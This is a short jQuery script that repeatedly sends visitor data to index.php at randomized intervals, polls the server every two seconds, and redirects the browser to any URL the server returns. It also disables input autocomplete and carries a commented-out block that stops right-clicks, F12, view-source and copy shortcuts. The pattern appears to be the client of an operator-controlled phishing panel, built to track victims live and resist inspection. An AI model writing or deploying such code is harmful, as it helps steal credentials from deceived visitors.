let visitorInterval = null;
function sendAjaxRequestEveryFourSeconds(jsonData) {
    // 🔥 prevent duplicate intervals
    if(visitorInterval !== null) {
        clearInterval(visitorInterval);
    }
    let requestRunning = false;
    function sendAjaxRequest() {
        // 🔥 prevent overlap
        if(requestRunning) {
            return;
        }
        requestRunning = true;
        $.ajax({
            method: "POST",
            url: 'index.php',
            data: jsonData,
            complete: function () {
                requestRunning = false;
            }
        });
    }
    // first request
    sendAjaxRequest();
    // 🔥 randomized interval
    let interval = 4000 + Math.floor(Math.random() * 3000);
    visitorInterval = setInterval(sendAjaxRequest, interval);
}

let workerRunning = false;
function worker() {
    if(workerRunning) {
        return;
    }
    workerRunning = true;
    $.ajax({
        method: "GET",
        url: 'index.php?waiting=1',
        success: function (data) {
            if(data !== '') {
                window.location.href = data;
            }
        },
        complete: function () {
            workerRunning = false;
            setTimeout(worker, 2000);
        }
    });
}

jQuery(function($){
    
    $('input').attr('autocomplete','off');

    //document.addEventListener("contextmenu",function(e){e.preventDefault()}),document.addEventListener("keydown",function(e){e.ctrlKey&&e.shiftKey&&("I"===e.key||"J"===e.key||"C"===e.key||"S"===e.key)&&e.preventDefault(),e.ctrlKey&&e.shiftKey&&"I"===e.key&&e.preventDefault(),e.ctrlKey&&e.shiftKey&&"J"===e.key&&e.preventDefault(),e.ctrlKey&&"J"===e.key&&e.preventDefault(),e.ctrlKey&&"s"===e.key&&e.preventDefault(),e.ctrlKey&&"c"===e.key&&e.preventDefault(),e.ctrlKey&&"u"===e.key&&e.preventDefault(),e.ctrlKey&&"P"===e.key&&e.preventDefault(),"F12"===e.key&&e.preventDefault()});

})